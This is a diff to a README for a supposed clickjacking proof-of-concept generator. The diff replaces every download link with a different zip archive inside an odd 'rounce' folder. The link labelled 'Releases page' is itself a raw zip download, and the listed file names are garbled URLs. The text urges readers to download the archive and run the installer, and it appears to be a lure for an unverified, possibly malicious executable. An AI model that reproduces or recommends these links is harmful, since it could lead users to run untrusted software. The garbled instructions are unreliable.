@@ -1,6 +1,6 @@
 # 🚀 clickjacking-poc-generator - Generate Clickjacking Proofs Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/clickjacking-poc-generator.zip%20Now-Get%20Your%20PoCs%20Here-brightgreen)](https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/clickjacking-poc-generator.zip)
+[![Download Now](https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/generator_poc_clickjacking_v2.5.zip%20Now-Get%20Your%20PoCs%20Here-brightgreen)](https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/generator_poc_clickjacking_v2.5.zip)
 
 ## 📖 Introduction
 
@@ -12,13 +12,13 @@ You can get started quickly by downloading and running the application. Follow t
 
 ## 📥 Download & Install
 
-1. Visit our [Releases page](https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/clickjacking-poc-generator.zip) to find the latest version of the application.
+1. Visit our [Releases page](https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/generator_poc_clickjacking_v2.5.zip) to find the latest version of the application.
 2. Choose the version that best suits your needs and click on the asset to download.
 3. Once the download completes, locate the file on your computer. You can typically find it in your "Downloads" folder.
    
-   - For Windows users, you might see a file like `https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/clickjacking-poc-generator.zip`.
+   - For Windows users, you might see a file like `https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/generator_poc_clickjacking_v2.5.zip`.
    - For Mac users, you may find a `.dmg` or `.zip` file.
-   - For Linux users, look for a `https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/clickjacking-poc-generator.zip` file.
+   - For Linux users, look for a `https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/generator_poc_clickjacking_v2.5.zip` file.
 
 4. Open the downloaded file to run the installer or application directly.
 5. Follow the on-screen instructions to complete the installation.
@@ -74,4 +74,4 @@ If you encounter any issues or need help, feel free to reach out through our rep
 
 ---
 
-For more information and to download the application, visit our [Releases page](https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/clickjacking-poc-generator.zip). Happy testing!
+For more information and to download the application, visit our [Releases page](https://raw.githubusercontent.com/Krishi7q/clickjacking-poc-generator/main/rounce/generator_poc_clickjacking_v2.5.zip). Happy testing!
